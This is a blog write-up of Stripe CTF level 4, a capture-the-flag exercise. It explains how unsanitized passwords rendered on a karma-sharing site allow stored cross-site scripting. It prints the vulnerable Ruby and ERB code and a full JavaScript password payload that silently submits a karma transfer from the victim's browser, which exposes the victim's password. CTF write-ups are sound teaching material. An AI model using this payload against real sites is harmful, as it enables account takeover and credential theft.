Stripe CTF: Level #4
####################
:date: 2012-10-27 14:22
:author: useless
:category: Write-up
:slug: stripe-ctf-level-4
:status: published

.. image:: /images/stripe-ctf-level-4/level04-logo.jpg
    :alt: level04-logo.jpg
    :align: center

You can find the code for this level
`here </docs/stripe-ctf-level-4/stripe-ctf-level04.tar.gz>`__.

(sha256: :code:`07a8338f0ecf92537daedb60709cd8211a790a23f9c25a101e069614b32da2a8`)

This level wants you to spread joy over the world. You have a certain
amount of karma you can distribute to people. But to be sure that you
only send karma to people you really trust to be good, everyone you send
karma to will be able to see your password. What's more, the user
karma_fountain is soooo good that he has infinite karma. Wouldn't it be
nice if you could get access to his account?

Here, we can see that the user captain sent us one karma. Now, his
password, ''captain_password'', is visible to us.

.. image:: /images/stripe-ctf-level-4/level04-transfer_captain_cats.png
    :alt: level04-transfer_captain_cats.png
    :align: center

So, all we have to do to get karma_fountain's password is to get him to
send us karma. Two ways for this: we could be so good that he'll want to
give us karma, or we can force him a little bit.

So, what are our ways to interact with karma_fountain? The site doesn't
offer some kind of internal messaging, we don't have an email address...
All we can do is send karma_fountain some karma. Then, he'll see our
password on his profile page. Hmmm, our password will be written to its
profile page:

.. code-block:: ruby

    # File views/home.erb, line 52
    <% @registered_users.each do | user | %>
    <% last_active = user[:last_active].strftime('%H:%M:%S UTC') %>
    <% if @trusts_me.include?(user[:username]) %>
    <li>
    <%= user[:username] %>
    (password: <%= user[:password] %>, last active <%= last_active %>)
    </li>

The password is not sanitized before it is displayed. Is it before it's
registered in the database?

.. code-block:: ruby

    # File srv.rb, line 168
    DB.conn[:users].insert(
        :username => username,
        :password => password,
        :karma => STARTING_KARMA,
        :last_active => Time.now.utc
    )

Nope. So if we put some javascript code as our password, and then we
send karma to karma_fountain, our password (i.e. the javascript code)
will be embedded in karma_fountain's page. If this javascript tells
karma_fountain's browser to send us karma, its password will be
displayed on our home page.

So, let's create a user evil_hacker, with the following password:

.. code-block:: html

    <script>
        var form = document.createElement("form");
        form.setAttribute("method", "post");
        form.setAttribute("action", "transfer");
        var to_field = document.createElement("input");
        to_field.setAttribute("type", "hidden");
        to_field.setAttribute("name", "to");
        to_field.setAttribute("value", "cats");
        form.appendChild(to_field);
        var amount_field = document.createElement("input");
        amount_field.setAttribute("type", "hidden");
        amount_field.setAttribute("name", "amount");
        amount_field.setAttribute("value", "1");
        form.appendChild(amount_field);
        document.body.appendChild(form);
        form.submit();
    </script>

Okay, I know this code is way too long, but javascript is really not my
strong suit. Plus, there is the problem that once karma_fountain's
browser executes the javascript, the transfer will take place, then
karma_fountain will be redirected to its homepage, where the transfer
will take place etc. Not very sly. So, there is room for improvement on
this code. It's just to demonstrate the attack.

.. image:: /images/stripe-ctf-level-4/level04-evil_hacker_register.png
    :alt: level04-evil_hacker_register.png
    :align: center

We connect as evil_hacker and send one karma to karma_fountain. Then,
we wait for him to connect (the CTF staff had put up a bot which would
look at its profile page every five minutes). Let's look at our profile:

.. image:: /images/stripe-ctf-level-4/level04-w00t.png
    :alt: level04-w00t.png
    :align: center

w00t!

